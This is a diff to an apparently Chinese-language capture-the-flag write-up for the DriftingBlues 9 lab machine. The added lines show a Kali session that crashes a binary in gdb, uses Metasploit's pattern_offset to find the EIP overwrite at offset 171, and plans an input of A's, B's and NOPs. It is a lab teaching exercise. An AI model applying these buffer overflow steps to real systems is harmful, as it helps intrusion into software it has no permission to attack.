@@ -1,3 +1,4 @@
+[Site Unreachable](https://grumpygeekwrites.wordpress.com/2021/05/12/driftingblues-9/)
 
 |   |   |   |
 |---|---|---|
@@ -158,9 +159,27 @@ gdb -q input
 ```
 gdb调试，得到可以看到在 0x41376641 处得到了分段错误。
 ```c
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ gdb -q input
+Reading symbols from input...
+(No debugging symbols found in input)
+(gdb) r    xxxxxxxxxxxxxx好多字符
+
 Program received signal SIGSEGV, Segmentation fault.
 0x41376641 in ?? ()
+```
+现在，我们需要用它来查找偏移量。
+接着我们使用 patter_offset.rb 来查找我们可以覆盖 EIP 的字节数。执行后可以看到171字节后可以覆盖EIP。
+```c
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
+└─$ ./pattern_offset.rb -l 200 -q 0x41376641
+[*] Exact match at offset 171
+
+┌──(kali㉿kali)-[~]
+└─$ msf-pattern_offset -l 200 -q 0x41376641
+[*] Exact match at offset 171
 
 ```
 
-接着我们使用 patter_offset.rb 来查找我们可以覆盖 EIP 的字节数。执行后可以看到171字节后可以覆盖EIP。
+
+我们在 171 处得到了精确匹配。现在，我们可以使用 python 命令简单地创建字符串。例如，输入包含具有 171 个 A、4 个 B 和 500 个 nop 的简单输入。
